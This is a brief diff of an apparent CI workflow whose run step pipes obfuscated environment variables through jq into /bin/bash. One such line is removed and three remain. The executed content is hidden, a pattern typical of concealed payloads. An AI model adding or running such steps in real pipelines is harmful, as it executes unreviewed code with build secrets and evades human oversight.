@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$g5365" | jq -r .gqmxk5 | /bin/bash
           printf '%s' "$su26935" | jq -r .l1734 | /bin/bash
-          printf '%s' "$win27" | jq -r .ox85013 | /bin/bash
           printf '%s' "$vgx7" | jq -r .asq40565 | /bin/bash
 
       - name: Upload results
